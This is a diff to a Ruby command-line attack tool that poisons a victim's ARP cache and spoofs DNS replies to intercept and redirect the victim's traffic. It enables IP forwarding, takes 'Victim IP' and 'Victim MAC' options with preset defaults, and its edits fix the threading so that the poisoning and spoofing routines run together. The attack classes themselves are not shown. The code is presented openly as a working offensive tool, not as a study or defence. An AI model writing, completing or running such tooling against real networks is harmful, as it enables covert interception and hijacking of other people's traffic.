@@ -27,11 +27,11 @@ Usage:
     ruby main.rb [options]
     EOS
     
-    opt :host, "Victim IP", :short => "h", :type => :string, :default => "192.168.1.72" # String --host <s>, default 127.0.0.1
-    opt :mac, "Victim MAC", :short => "m", :type => :string # String --mac <s>
-    opt :spoof, "Spoofig IP", :short => "s", :type => :string, :default => "70.70.242.254" # String --spoof <s>, default 70.70.242.254
-    opt :gate, "Gateway IP", :short => "g", :type => :string, :default => "192.168.1.254" # String --gate <s>, default 192.168.0.100
-    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlan0" # String --iface <s>, default em1
+    opt :host, "Victim IP", :short => "h", :type => :string, :default => "192.168.1.72"
+    opt :mac, "Victim MAC", :short => "m", :type => :string
+    opt :spoof, "Spoofig IP", :short => "s", :type => :string, :default => "70.70.242.254" 
+    opt :gate, "Gateway IP", :short => "g", :type => :string, :default => "192.168.1.254"
+    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlan0"
     opt :route, "Router MAC", :short => "r", :type => :string, :default => "00:1a:6d:38:15:ff"
 end
 if Process.uid != 0
@@ -42,14 +42,17 @@ begin
 
     # Enable Forwarding
     `echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+    # Block returning DNS traffic
+
     arp = ARP.new(opts[:host], opts[:mac], opts[:gate], opts[:route], opts[:iface])
     dns = DNS.new(opts[:spoof], opts[:host], opts[:iface])
 
     t_arp = Thread.new { arp.poison }
-    t_dns = Thread.new (dns.listen)
-    t_arp.join()
-    t_dns.join()
+    t_dns = Thread.new { dns.listen }
 
+    t_dns.join()
+    t_arp.join()
 rescue Interrupt => e
     puts "Stopping..."
     `echo 0 > /proc/sys/net/ipv4/ip_forward`    
